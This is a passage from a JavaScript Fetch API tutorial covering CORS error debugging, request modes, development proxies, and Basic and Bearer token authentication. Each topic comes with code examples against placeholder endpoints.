    throw new Error(`HTTP ${response.status}`);
  }
  
  return response.json();
}
```

### Mode Interaction with Other Options

**With `credentials`:**

- `cors` + `credentials: 'include'` → Sends cookies cross-origin (server must allow)
- `no-cors` + `credentials: 'include'` → Sends cookies but response still opaque
- `same-origin` + `credentials: 'omit'` → Compatible, no cookies sent

**With `redirect`:**

- `cors` → Follows redirects, applies CORS to each hop
- `no-cors` → Follows redirects, all responses opaque
- `same-origin` → [Inference] Redirects to different origin would likely fail

**With custom headers:**

- `cors` → Requires preflight if non-simple headers
- `no-cors` → Only simple headers allowed, custom headers stripped
- `same-origin` → All headers allowed

### Browser Compatibility and Defaults

**Default behavior:**

- Same-origin requests: `mode` defaults to `cors` but behaves like `same-origin` (no CORS needed)
- Cross-origin requests: `mode` defaults to `cors`

**Explicit setting recommended for:**

- Security-critical same-origin-only requests → Set `same-origin`
- Fire-and-forget cross-origin → Set `no-cors` (if appropriate)
- Standard cross-origin API calls → Explicitly set `cors` for clarity

---

## CORS Error Debugging

### Understanding CORS Error Messages

CORS errors manifest differently across browsers, but common patterns include:

```
Access to fetch at 'https://api.example.com' from origin 'https://myapp.com' 
has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is 
present on the requested resource.
```

```
Access to fetch at 'https://api.example.com' from origin 'https://myapp.com' 
has been blocked by CORS policy: Response to preflight request doesn't pass 
access control check: No 'Access-Control-Allow-Origin' header is present.
```

The browser console provides the most detailed CORS error information. Network tab inspections alone may miss critical details since CORS failures occur at the browser security layer before response data is fully accessible.

### Preflight Request Failures

Preflight requests (OPTIONS) fail when:

**Missing or incorrect `Access-Control-Allow-Methods`**

```javascript
// Request uses POST
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ data: 'value' })
});

// Server must respond to OPTIONS with:
// Access-Control-Allow-Methods: POST
```

**Missing `Access-Control-Allow-Headers` for custom headers**

```javascript
// Request includes custom header
fetch('https://api.example.com/data', {
  headers: { 
    'X-Custom-Header': 'value',
    'Authorization': 'Bearer token'
  }
});

// Server OPTIONS response needs:
// Access-Control-Allow-Headers: X-Custom-Header, Authorization
```

**Incorrect `Access-Control-Max-Age` causing excessive preflights**

```
Access-Control-Max-Age: 86400
```

Low or missing values cause repeated preflight requests, impacting performance. [Inference] Setting this too high may prevent immediate recognition of server CORS configuration changes.

### Credentials and Authentication Issues

**Credentials mode with wildcard origin**

```javascript
// This configuration will fail
fetch('https://api.example.com/data', {
  credentials: 'include'
});

// If server responds with:
// Access-Control-Allow-Origin: *
// Access-Control-Allow-Credentials: true
// Error: Wildcard not allowed with credentials
```

**Solution requires explicit origin:**

```
Access-Control-Allow-Origin: https://myapp.com
Access-Control-Allow-Credentials: true
```

**Missing credentials in request**

```javascript
// Cookies won't be sent without this
fetch('https://api.example.com/data', {
  credentials: 'include'  // or 'same-origin'
});
```

### Response Header Exposure

**Accessing headers that aren't exposed**

```javascript
fetch('https://api.example.com/data')
  .then(response => {
    // This may return null if header not exposed
    const customHeader = response.headers.get('X-Custom-Header');
    const rateLimit = response.headers.get('X-RateLimit-Remaining');
  });
```

**Server must explicitly expose custom headers:**

```
Access-Control-Expose-Headers: X-Custom-Header, X-RateLimit-Remaining
```

Simple headers accessible by default: `Cache-Control`, `Content-Language`, `Content-Type`, `Expires`, `Last-Modified`, `Pragma`.

### HTTP vs HTTPS Origin Mismatches

Mixed content requests fail with CORS-like errors:

```javascript
// On https://myapp.com
fetch('http://api.example.com/data')
// Blocked: Mixed Content
```

This appears similar to CORS errors but is actually a mixed content policy violation. HTTPS pages cannot make requests to HTTP endpoints.

### Port Number Considerations

Origins with different ports are treated as separate origins:

```
https://myapp.com:3000 ≠ https://myapp.com:8080
http://localhost:3000 ≠ http://localhost:8080
```

Each requires separate `Access-Control-Allow-Origin` configuration or use of origin echo patterns on the server.

### Debugging Non-Standard Request Methods

```javascript
fetch('https://api.example.com/data', {
  method: 'PATCH'  // or DELETE, PUT, etc.
});
```

Non-simple methods (anything except GET, HEAD, POST with simple content types) trigger preflight. Verify:

- Server handles OPTIONS requests
- `Access-Control-Allow-Methods` includes the method
- Method is correctly implemented on the server

### Content-Type Header Preflight Triggers

These content types do NOT trigger preflight:

- `application/x-www-form-urlencoded`
- `multipart/form-data`
- `text/plain`

These DO trigger preflight:

```javascript
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },  // Triggers preflight
  body: JSON.stringify({ data: 'value' })
});
```

### Network Tab Investigation

**What to check in browser DevTools Network tab:**

1. **Presence of OPTIONS request** - Should appear before actual request for non-simple requests
2. **OPTIONS request status** - Should return 200 or 204
3. **Response headers on OPTIONS:**
    - `Access-Control-Allow-Origin`
    - `Access-Control-Allow-Methods`
    - `Access-Control-Allow-Headers`
    - `Access-Control-Max-Age`
4. **Actual request status** - May fail even if preflight succeeds
5. **Response headers on actual request:**
    - `Access-Control-Allow-Origin` (required on all responses)
    - `Access-Control-Allow-Credentials` (if using credentials)

### Server Response Status Codes

**Preflight (OPTIONS) acceptable status codes:**

- 200 OK (most common)
- 204 No Content (preferred by some, no response body)

**Status codes that cause CORS failures:**

- 4xx or 5xx on OPTIONS request
- OPTIONS returns 200 but missing required CORS headers
- Actual request returns correct headers but inappropriate status (e.g., 401 without proper CORS headers)

### Common False Positives

**Server error appearing as CORS error:**

```javascript
// Server throws 500 error without CORS headers
fetch('https://api.example.com/data')
// Browser shows CORS error, but real issue is server crash
```

Check server logs to distinguish actual server errors from CORS configuration issues.

**Authentication failures masquerading as CORS:**

```javascript
// 401 Unauthorized without proper CORS headers
// Shows as CORS error in console
```

Ensure authentication endpoints return CORS headers even on failure responses.

### Localhost Development Complications

**Different localhost interpretations:**

```
http://localhost:3000 ≠ http://127.0.0.1:3000
```

Some browsers or systems treat these as different origins. [Inference] This is likely due to DNS resolution differences and origin comparison at the string level.

**File protocol limitations:**

```javascript
// Opening HTML file directly (file:///)
fetch('https://api.example.com/data')
// Often blocked due to null origin
```

File protocol has special origin handling. Use local development server instead.

### Third-Party Cookie Blocking

Modern browsers block third-party cookies by default:

```javascript
fetch('https://api.example.com/data', {
  credentials: 'include'
});
```

Even with correct CORS headers, cookies may not be sent/received due to browser privacy settings. Safari is particularly strict with third-party cookies.

[Inference] This affects cross-origin authenticated requests even when CORS is correctly configured, as the browser may prevent cookie transmission at a different security layer.

### Proxy-Based Debugging Workarounds

Development proxies can mask CORS issues:

```javascript
// In development, proxy configuration in package.json, webpack, or vite.config
// may hide CORS problems that appear in production
{
  "proxy": "https://api.example.com"
}
```

[Inference] Testing against actual cross-origin endpoints during development helps identify CORS issues earlier.

### Request Header Case Sensitivity

Header names are case-insensitive in HTTP, but some server frameworks may handle them case-sensitively:

```javascript
fetch('https://api.example.com/data', {
  headers: { 'content-type': 'application/json' }
});
```

Standard practice uses canonical forms: `Content-Type`, `Authorization`, etc.

### Debugging Strategies

**Systematic isolation:**

1. Test with simple GET request first (no preflight)
2. Add `Content-Type: application/json` (triggers preflight)
3. Add custom headers one at a time
4. Add credentials mode
5. Test other HTTP methods

**Browser comparison:** Different browsers may show different error messages for the same CORS failure. Testing in multiple browsers can provide additional diagnostic information.

**cURL bypass test:**

```bash
curl -X OPTIONS https://api.example.com/data \
  -H "Origin: https://myapp.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type" \
  -v
```

This bypasses browser CORS enforcement to see raw server responses.

**Browser extensions:** CORS browser extensions that inject headers should be disabled during debugging, as they mask real issues. [Unverified] Some extensions may not inject headers consistently across all request types.

### Timing and Race Conditions

**Preflight caching issues:**

```javascript
// First request succeeds, subsequent fail
fetch('https://api.example.com/data', { method: 'POST' });
```

[Inference] This pattern suggests server configuration changed between requests, or preflight cache (`Access-Control-Max-Age`) expired between tests.

**Server restarts during debugging:** Preflight cache may hold stale configuration even after server CORS settings are updated. Clear browser cache or wait for `Access-Control-Max-Age` duration to expire.

### Multiple Redirect Complications

```javascript
fetch('https://api.example.com/redirect-to-final')
// If redirect doesn't preserve CORS headers, fails
```

Each redirect response must include appropriate CORS headers. The browser performs CORS checks at each redirect step.

### Framework-Specific Debugging

Different server frameworks handle OPTIONS requests differently. Some automatically respond to OPTIONS, others require explicit route handlers.

[Inference] Missing explicit OPTIONS route handlers is a common issue in Express.js, Flask, and similar frameworks when developers only define POST/GET routes.

### Response Body Access After CORS Failure

```javascript
fetch('https://api.example.com/data')
  .then(response => response.json())
  .catch(error => {
    // error.message shows CORS error
    // Cannot access response body due to CORS failure
  });
```

CORS failures prevent access to response content entirely. The error object will not contain server-returned error messages or response bodies.

### Wildcard Subdomain Patterns

```
Access-Control-Allow-Origin: https://*.example.com
```

This is NOT valid CORS syntax. CORS headers must specify exact origins or use `*`. Multiple origins require server-side logic to echo appropriate origin:

```
// Server checks request Origin header
// Responds with matching origin if in allowlist
Access-Control-Allow-Origin: https://app1.example.com
```

### SameSite Cookie Attribute Interactions

```javascript
// Cookie set with SameSite=Strict or SameSite=Lax
fetch('https://api.example.com/data', {
  credentials: 'include'
});
```

`SameSite` cookie attributes interact with CORS and credentials mode. `SameSite=Strict` cookies are never sent in cross-origin requests, regardless of CORS configuration. `SameSite=Lax` allows some cross-origin GET requests but blocks others.

[Inference] CORS header configuration alone is insufficient for authenticated cross-origin requests when strict `SameSite` policies are applied.

---

## Fetch API: Proxy Patterns for Development

### Local Development Server Proxies

#### Webpack DevServer Proxy

Configure proxy rules in `webpack.config.js` to redirect API requests during development:

```javascript
module.exports = {
  devServer: {
    proxy: {
      '/api': {
        target: 'http://localhost:3000',
        pathRewrite: {'^/api': ''},
        changeOrigin: true,
        secure: false
      }
    }
  }
};
```

Key configuration options:

- `target`: Backend server URL
- `pathRewrite`: Transform request paths before forwarding
- `changeOrigin`: Modifies the origin header to match target
- `secure`: Set to false for self-signed certificates
- `bypass`: Function to conditionally skip proxy based on request

#### Vite Proxy Configuration

Vite provides similar proxy capabilities with cleaner syntax:

```javascript
export default {
  server: {
    proxy: {
      '/api': {
        target: 'http://localhost:8080',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\/api/, '')
      },
      '/ws
```

---

# Authentication

## Basic Authentication

### Setting Up Basic Authentication Headers

Basic authentication requires encoding credentials in Base64 format and including them in the Authorization header. The format follows the pattern `Basic base64(username:password)`.

```javascript
const username = 'user';
const password = 'pass123';
const credentials = btoa(`${username}:${password}`);

fetch('https://api.example.com/data', {
  method: 'GET',
  headers: {
    'Authorization': `Basic ${credentials}`
  }
})
.then(response => response.json())
.then(data => console.log(data));
```

### Using the Headers Object

The Headers interface provides a structured way to manage HTTP headers, including authentication credentials.

```javascript
const headers = new Headers();
headers.append('Authorization', `Basic ${btoa('user:pass123')}`);
headers.append('Content-Type', 'application/json');

fetch('https://api.example.com/resource', {
  method: 'POST',
  headers: headers,
  body: JSON.stringify({ data: 'value' })
})
.then(response => response.json());
```

### Handling Authentication with Different HTTP Methods

#### GET Requests

```javascript
const auth = btoa('username:password');

fetch('https://api.example.com/users', {
  headers: {
    'Authorization': `Basic ${auth}`
  }
})
.then(response => {
  if (response.status === 401) {
    throw new Error('Authentication failed');
  }
  return response.json();
});
```

#### POST Requests

```javascript
fetch('https://api.example.com/users', {
  method: 'POST',
  headers: {
    'Authorization': `Basic ${btoa('user:pass')}`,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    name: 'John Doe',
    email: 'john@example.com'
  })
});
```

#### PUT Requests

```javascript
fetch('https://api.example.com/users/123', {
  method: 'PUT',
  headers: {
    'Authorization': `Basic ${btoa('user:pass')}`,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    name: 'Jane Doe'
  })
});
```

#### DELETE Requests

```javascript
fetch('https://api.example.com/users/123', {
  method: 'DELETE',
  headers: {
    'Authorization': `Basic ${btoa('user:pass')}`
  }
});
```

### Credential Management and Storage

#### Storing Credentials Securely

```javascript
// Store in memory only - not in localStorage
class AuthManager {
  constructor() {
    this.credentials = null;
  }
  
  setCredentials(username, password) {
    this.credentials = btoa(`${username}:${password}`);
  }
  
  getAuthHeader() {
    return this.credentials ? `Basic ${this.credentials}` : null;
  }
  
  clearCredentials() {
    this.credentials = null;
  }
}

const authManager = new AuthManager();
authManager.setCredentials('user', 'pass');

fetch('https://api.example.com/data', {
  headers: {
    'Authorization': authManager.getAuthHeader()
  }
});
```

#### Reusable Fetch Wrapper

```javascript
function authenticatedFetch(url, options = {}) {
  const username = 'user';
  const password = 'pass';
  const auth = btoa(`${username}:${password}`);
  
  const defaultOptions = {
    headers: {
      'Authorization': `Basic ${auth}`,
      ...options.headers
    }
  };
  
  return fetch(url, { ...options, ...defaultOptions });
}

// Usage
authenticatedFetch('https://api.example.com/data')
  .then(response => response.json())
  .then(data => console.log(data));
```

### Response Status Handling

#### Authentication Status Codes

```javascript
fetch('https://api.example.com/protected', {
  headers: {
    'Authorization': `Basic ${btoa('user:pass')}`
  }
})
.then(response => {
  switch(response.status) {
    case 200:
      return response.json();
    case 401:
      throw new Error('Invalid credentials');
    case 403:
      throw new Error('Access forbidden');
    default:
      throw new Error(`Unexpected status: ${response.status}`);
  }
})
.then(data => console.log(data))
.catch(error => console.error(error));
```

#### Checking Authentication Header in Response

```javascript
fetch('https://api.example.com/resource', {
  headers: {
    'Authorization': `Basic ${btoa('user:pass')}`
  }
})
.then(response => {
  const authRequired = response.headers.get('WWW-Authenticate');
  
  if (response.status === 401 && authRequired) {
    console.log('Server requires authentication:', authRequired);
  }
  
  return response.json();
});
```

### CORS and Credentials

#### Including Credentials in Cross-Origin Requests

```javascript
fetch('https://api.example.com/data', {
  method: 'GET',
  credentials: 'include', // sends cookies and auth headers
  headers: {
    'Authorization': `Basic ${btoa('user:pass')}`
  }
})
.then(response => response.json());
```

#### Credentials Mode Options

```javascript
// 'omit' - never send credentials
fetch(url, { credentials: 'omit' });

// 'same-origin' - only send credentials for same-origin requests
fetch(url, { credentials: 'same-origin' });

// 'include' - always send credentials
fetch(url, { credentials: 'include' });
```

### Error Handling Patterns

#### Comprehensive Error Handling

```javascript
async function fetchWithBasicAuth(url, username, password) {
  try {
    const response = await fetch(url, {
      headers: {
        'Authorization': `Basic ${btoa(`${username}:${password}`)}`
      }
    });
    
    if (!response.ok) {
      if (response.status === 401) {
        throw new Error('Authentication failed: Invalid credentials');
      }
      if (response.status === 403) {
        throw new Error('Access denied: Insufficient permissions');
      }
      throw new Error(`HTTP error: ${response.status}`);
    }
    
    return await response.json();
    
  } catch (error) {
    if (error instanceof TypeError) {
      throw new Error('Network error: Check connection');
    }
    throw error;
  }
}
```

#### Retry Logic for Failed Authentication

```javascript
async function fetchWithRetry(url, credentials, maxRetries = 3) {
  let lastError;
  
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, {
        headers: {
          'Authorization': `Basic ${credentials}`
        }
      });
      
      if (response.status === 401) {
        throw new Error('Invalid credentials');
      }
      
      if (response.ok) {
        return await response.json();
      }
      
    } catch (error) {
      lastError = error;
      await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
    }
  }
  
  throw lastError;
}
```

### Advanced Patterns

#### Pre-flight Request Handling

```javascript
// For methods that trigger pre-flight (PUT, DELETE, custom headers)
fetch('https://api.example.com/resource', {
  method: 'PUT',
  headers: {
    'Authorization': `Basic ${btoa('user:pass')}`,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ data: 'value' })
})
.then(response => {
  // The browser handles OPTIONS request automatically
  return response.json();
});
```

#### Dynamic Credential Updates

```javascript
class DynamicAuthFetch {
  constructor() {
    this.authToken = null;
  }
  
  updateCredentials(username, password) {
    this.authToken = btoa(`${username}:${password}`);
  }
  
  async fetch(url, options = {}) {
    if (!this.authToken) {
      throw new Error('No credentials set');
    }
    
    const authOptions = {
      ...options,
      headers: {
        'Authorization': `Basic ${this.authToken}`,
        ...options.headers
      }
    };
    
    const response = await fetch(url, authOptions);
    
    if (response.status === 401) {
      this.authToken = null;
      throw new Error('Authentication expired');
    }
    
    return response;
  }
}

const authFetch = new DynamicAuthFetch();
authFetch.updateCredentials('user', 'password');
authFetch.fetch('https://api.example.com/data');
```

### Base64 Encoding Considerations

#### Handling Special Characters

```javascript
function encodeCredentials(username, password) {
  // btoa only works with ASCII characters
  const credentials = `${username}:${password}`;
  
  try {
    return btoa(credentials);
  } catch (error) {
    // For non-ASCII characters, use this approach
    return btoa(unescape(encodeURIComponent(credentials)));
  }
}

const auth = encodeCredentials('user@domain', 'pǎss123');
```

#### URL-Safe Encoding

```javascript
function urlSafeBase64(username, password) {
  const credentials = btoa(`${username}:${password}`);
  // Replace characters that may cause issues in URLs
  return credentials
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');
}
```

### Request Interceptors Pattern

```javascript
class FetchInterceptor {
  constructor(baseURL, username, password) {
    this.baseURL = baseURL;
    this.auth = btoa(`${username}:${password}`);
  }
  
  async request(endpoint, options = {}) {
    const url = `${this.baseURL}${endpoint}`;
    
    const config = {
      ...options,
      headers: {
        'Authorization': `Basic ${this.auth}`,
        'Content-Type': 'application/json',
        ...options.headers
      }
    };
    
    const response = await fetch(url, config);
    
    if (!response.ok) {
      throw new Error(`Request failed: ${response.status}`);
    }
    
    return response.json();
  }
  
  get(endpoint) {
    return this.request(endpoint, { method: 'GET' });
  }
  
  post(endpoint, data) {
    return this.request(endpoint, {
      method: 'POST',
      body: JSON.stringify(data)
    });
  }
}

const api = new FetchInterceptor('https://api.example.com', 'user', 'pass');
api.get('/users');
api.post('/users', { name: 'John' });
```

### Testing Authentication

#### Mock Fetch for Testing

```javascript
// Test helper
function mockFetch(expectedAuth, responseData) {
  return function(url, options) {
    const authHeader = options.headers?.Authorization;
    
    if (authHeader === `Basic ${expectedAuth}`) {
      return Promise.resolve({
        ok: true,
        status: 200,
        json: () => Promise.resolve(responseData)
      });
    }
    
    return Promise.resolve({
      ok: false,
      status: 401,
      json: () => Promise.resolve({ error: 'Unauthorized' })
    });
  };
}

// Usage in tests
const originalFetch = global.fetch;
global.fetch = mockFetch(btoa('user:pass'), { data: 'success' });

// Run your tests
fetchWithBasicAuth('https://api.example.com', 'user', 'pass')
  .then(data => console.log('Test passed:', data));

global.fetch = originalFetch;
```

### Security Considerations

#### Avoiding Credential Exposure

```javascript
// Never log credentials
function secureFetch(url, username, password) {
  const auth = btoa(`${username}:${password}`);
  
  // DO NOT log the auth header
  console.log('Making request to:', url);
  
  return fetch(url, {
    headers: {
      'Authorization': `Basic ${auth}`
    }
  });
}
```

#### HTTPS Enforcement

```javascript
function secureFetch(url, credentials) {
  if (!url.startsWith('https://')) {
    throw new Error('Basic Auth requires HTTPS');
  }
  
  return fetch(url, {
    headers: {
      'Authorization': `Basic ${credentials}`
    }
  });
}
```

### Response Body Handling

#### Handling Different Content Types

```javascript
async function fetchWithAuth(url, auth) {
  const response = await fetch(url, {
    headers: {
      'Authorization': `Basic ${auth}`
    }
  });
  
  const contentType = response.headers.get('content-type');
  
  if (contentType?.includes('application/json')) {
    return response.json();
  }
  
  if (contentType?.includes('text/')) {
    return response.text();
  }
  
  return response.blob();
}
```

#### Stream Handling

```javascript
async function streamWithAuth(url, auth) {
  const response = await fetch(url, {
    headers: {
      'Authorization': `Basic ${auth}`
    }
  });
  
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  
  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    
    const chunk = decoder.decode(value);
    console.log('Received chunk:', chunk);
  }
}
```

---

## Bearer Tokens

### Authentication Header Structure

Bearer tokens are transmitted via the `Authorization` header using the format `Bearer <token>`. The fetch API implements this through the `headers` option:

```javascript
fetch('https://api.example.com/data', {
  headers: {
    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
  }
})
```

### Header Configuration Methods

#### Object Literal Syntax

```javascript
const response = await fetch(url, {
  headers: {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
  }
});
```

#### Headers Constructor

```javascript
const headers = new Headers();
headers.append('Authorization', `Bearer ${token}`);
headers.append('Content-Type', 'application/json');

const response = await fetch(url, { headers });
```

#### Headers Instances with Set Method

```javascript
const headers = new Headers();
headers.set('Authorization', `Bearer ${token}`);
// set() replaces existing values, append() adds multiple values
```

### Token Management Patterns

#### Environment Variables

```javascript
const token = process.env.API_TOKEN;
// or in browser context
const token = import.meta.env.VITE_API_TOKEN;

fetch(url, {
  headers: { 'Authorization': `Bearer ${token}` }
});
```

#### Secure Storage in Browser

```javascript
// SessionStorage (cleared on tab close)
sessionStorage.setItem('authToken', token);
const storedToken = sessionStorage.getItem('authToken');

// LocalStorage (persists across sessions)
localStorage.setItem('authToken', token);
const persistentToken = localStorage.getItem('authToken');
```

#### Token Retrieval Functions

```javascript
async function getAuthToken() {
  const token = sessionStorage.getItem('authToken');
  if (!token) {
    throw new Error('No authentication token found');
  }
  return token;
}

async function authenticatedFetch(url, options = {}) {
  const token = await getAuthToken();
  
  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${token}`
    }
  });
}
```

### Token Refresh Mechanisms

#### Automatic Token Renewal

```javascript
let accessToken = 'current_token';
let refreshToken = 'refresh_token';

async function fetchWithTokenRefresh(url, options = {}) {
  try {
    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${accessToken}`
      }
    });

    if (response.status === 401) {
      // Token expired, attempt refresh
      const newToken = await refreshAccessToken();
      accessToken = newToken;
      
      // Retry original request with new token
      return fetch(url, {
        ...options,
        headers: {
          ...options.headers,
          'Authorization': `Bearer ${accessToken}`
        }
      });
    }

    return response;
  } catch (error) {
    throw error;
  }
}

async function refreshAccessToken() {
  const response = await fetch('https://api.example.com/auth/refresh', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${refreshToken}`
    }
  });

  if (!response.ok) {
    throw new Error('Token refresh failed');
  }

  const data = await response.json();
  return data.accessToken;
}
```

#### Interceptor Pattern

```javascript
class AuthenticatedFetch {
  constructor(baseURL, tokenProvider) {
    this.baseURL = baseURL;
    this.tokenProvider = tokenProvider;
  }

  async request(endpoint, options = {}) {
    const token = await this.tokenProvider();
    const url = `${this.baseURL}${endpoint}`;

    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${token}`
      }
    });

    if (response.status === 401) {
      // Handle token expiration
      await this.handleTokenExpiration();
      // Retry logic here
    }

    return response;
  }

  async handleTokenExpiration() {
    // Refresh token logic
  }
}

const api = new AuthenticatedFetch(
  'https://api.example.com',
  () => sessionStorage.getItem('authToken')
);
```

### CORS and Preflight Requests

#### Preflight Behavior with Authorization Headers

Custom headers like `Authorization` trigger CORS preflight (OPTIONS request). The server must respond with appropriate CORS headers:

```javascript
// Browser automatically sends OPTIONS request first
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer token123',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ data: 'value' })
});

// Server must respond to OPTIONS with:
// Access-Control-Allow-Origin: https://yourdomain.com
// Access-Control-Allow-Headers: Authorization, Content-Type
// Access-Control-Allow-Methods: POST, GET, OPTIONS
```

#### Credentials Mode

```javascript
fetch(url, {
  method: 'GET',
  credentials: 'include', // Sends cookies with request
  headers: {
    'Authorization': `Bearer ${token}`
  }
});

// credentials options:
// 'omit' - never send cookies
// 'same-origin' - send cookies only for same-origin requests (default)
// 'include' - always send cookies, even cross-origin
```

### Error Handling Specific to Bearer Tokens

#### Status Code Handling

```javascript
async function fetchWithAuth(url, token) {
  const response = await fetch(url, {
    headers: { 'Authorization': `Bearer ${token}` }
  });

  switch (response.status) {
    case 401:
      throw new Error('Unauthorized: Invalid or expired token');
    case 403:
      throw new Error('Forbidden: Insufficient permissions');
    case 404:
      throw new Error('Resource not found');
    case 500:
      throw new Error('Server error');
    default:
      if (!response.ok) {
        throw new Error(`HTTP error: ${response.status}`);
      }
  }

  return response.json();
}
```

#### Comprehensive Error Handler

```javascript
async function authenticatedRequest(url, options = {}) {
  try {
    const token = getToken();
    
    if (!token) {
      throw new Error('No authentication token available');
    }

    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${token}`
      }
    });

    if (response.status === 401) {
      // Clear invalid token
      clearToken();
      redirectToLogin();
      throw new Error('Session expired');
    }

    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}));
      throw new Error(errorData.message || `Request failed: ${response.status}`);
    }

    return await response.json();

  } catch (error) {
    if (error.name === 'TypeError') {
      // Network error
      throw new Error('Network error: Unable to reach server');
    }
    throw error;
  }
}
```

### Token Security Considerations

#### Token Exposure Prevention

```javascript
// DON'T: Log tokens
console.log('Token:', token); // SECURITY RISK

// DON'T: Include in URLs
fetch(`https://api.example.com/data?token=${token}`); // SECURITY RISK

// DO: Use headers only
fetch(url, {
  headers: { 'Authorization': `Bearer ${token}` }
});
```

#### Token Validation Before Sending

```javascript
function isTokenValid(token) {
  if (!token || typeof token !== 'string') return false;
  
  // JWT structure check (header.payload.signature)
  const parts = token.split('.');
  if (parts.length !== 3) return false;
  
  try {
    // Decode payload (base64url)
    const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
    
    // Check expiration
    if (payload.exp && payload.exp * 1000 < Date.now()) {
      return false;
    }
    
    return true;
  } catch {
    return false;
  }
}

async function safeFetch(url, token, options = {}) {
  if (!isTokenValid(token)) {
    throw new Error('Invalid token');
  }

  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${token}`
    }
  });
}
```

#### XSS Protection

```javascript
// Avoid storing tokens in easily accessible locations
// [Inference] XSS attacks can extract tokens from localStorage

// More secure: Use httpOnly cookies (set by server)
// Token not accessible to JavaScript, reducing XSS risk
// [Inference] This pattern requires server-side session management

// Or use short-lived tokens with refresh mechanism
const TOKEN_EXPIRY = 15 * 60 * 1000; // 15 minutes
```

### Advanced Patterns

#### Request Queuing During Token Refresh

```javascript
class TokenManager {
  constructor() {
    this.token = null;
    this.refreshPromise = null;
  }

  async getToken() {
    if (this.token && !this.isExpired(this.token)) {
      return this.token;
    }

    // If refresh is already in progress, wait for it
    if (this.refreshPromise) {
      return this.refreshPromise;
    }

    // Start new refresh
    this.refreshPromise = this.refreshToken()
      .then(newToken => {
        this.token = newToken;
        this.refreshPromise = null;
        return newToken;
      })
      .catch(error => {
        this.refreshPromise = null;
        throw error;
      });

    return this.refreshPromise;
  }

  async refreshToken() {
    // Refresh logic
    const response = await fetch('/auth/refresh', {
      method: 'POST',
      credentials: 'include'
    });
    
    const data = await response.json();
    return data.accessToken;
  }

  isExpired(token) {
    try {
      const payload = JSON.parse(atob(token.split('.')[1]));
      return payload.exp * 1000 < Date.now();
    } catch {
      return true;
    }
  }
}

const tokenManager = new TokenManager();

async function fetch WithAuth(url, options = {}) {
  const token = await tokenManager.getToken();
  
  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${token}`
    }
  });
}
```

#### Retry Logic with Exponential Backoff

```javascript
async function fetchWithRetry(url, token, maxRetries = 3) {
  let lastError;

  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, {
        headers: { 'Authorization': `Bearer ${token}` }
      });

      if (response.status === 401) {
        // Don't retry auth failures
        throw new Error('Authentication failed');
      }

      if (response.ok) {
        return response;
      }

      if (response.status >= 500) {
        // Server error, retry
        const delay = Math.pow(2, i) * 1000; // Exponential backoff
        await new Promise(resolve => setTimeout(resolve, delay));
        continue;
      }

      // Client error, don't retry
      throw new Error(`HTTP ${response.status}`);

    } catch (error) {
      lastError = error;
      if (i === maxRetries - 1) break;
      
      const delay = Math.pow(2, i) * 1000;
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }

  throw lastError;
}
```

#### Multiple Token Types

```javascript
async function fetchWithMultipleTokens(url, accessToken, apiKey) {
  return fetch(url, {
    headers: {
      'Authorization': `Bearer ${accessToken}`,
      'X-API-Key': apiKey,
      'Content-Type': 'application/json'
    }
  });
}

// OAuth 2.0 token types
async function fetchWithOAuth(url, token, tokenType = 'Bearer') {
  return fetch(url, {
    headers: {
      'Authorization': `${tokenType} ${token}`
      // tokenType could be: Bearer, MAC, etc.
    }
  });
}
```

### Testing Bearer Token Authentication

#### Mock Fetch for Testing

```javascript
// Mock authenticated fetch
global.fetch = jest.fn((url, options) => {
  const authHeader = options?.headers?.Authorization;
  
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return Promise.resolve({
      ok: false,
      status: 401,
      json: () => Promise.resolve({ error: 'Unauthorized' })
    });
  }

  const token = authHeader.replace('Bearer ', '');
  
  if (token === 'valid_token') {
    return Promise.resolve({
      ok: true,
      status: 200,
      json: () => Promise.resolve({ data: 'success' })
    });
  }

  return Promise.resolve({
    ok: false,
    status: 401,
    json: () => Promise.resolve({ error: 'Invalid token' })
  });
});
```

#### Integration Test Example

```javascript
describe('Authenticated API calls', () => {
  test('includes bearer token in request', async () => {
    const mockFetch = jest.spyOn(global, 'fetch');
    const token = 'test_token_123';

    await authenticatedFetch('https://api.example.com/data', token);

    expect(mockFetch).toHaveBeenCalledWith(
      'https://api.example.com/data',
      expect.objectContaining({
        headers: expect.objectContaining({
          'Authorization': 'Bearer test_token_123'
        })
      })
    );
  });

  test('handles 401 response', async () => {
    global.fetch = jest.fn().mockResolvedValue({
      ok: false,
      status: 401
    });

    await expect(
      authenticatedFetch('https://api.example.com/data', 'invalid_token')
    ).rejects.toThrow('Unauthorized');
  });
});
```

### Performance Optimization

#### Token Caching

```javascript
class CachedTokenProvider {
